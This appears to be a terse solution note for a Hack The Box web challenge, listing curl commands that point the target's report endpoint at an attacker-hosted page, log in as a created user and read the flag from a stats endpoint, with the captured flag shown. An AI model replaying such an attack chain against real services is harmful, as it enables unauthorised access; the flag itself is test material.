#class pollute

'''
Put index.html to server
Use cloudflare to dns a domain name to server

#curl "http://94.237.53.21:53131/report_tornado?ip=www2.wyu88.com/%23"
curl "http://94.237.53.21:53131/report_tornado?ip=macavity.tiiny.site/%23"
#curl -X POST "http://94.237.53.21:53131/login" -H "Content-Type: application/json" -d '{"username":"x", "password":"x"}' -c cookie.txt
curl -X POST "http://94.237.53.21:53131/login" -H "Content-Type: application/json" -d '{"username":"kittykat", "password":"kittykat"}' -c cookie.txt
curl -X GET "http://94.237.53.21:53131/stats" -b cookie.txt

{"success": {"type": "Success", "message": "HTB{s1mpl3_stuff_but_w1th_4_tw15t!}"}}
'''
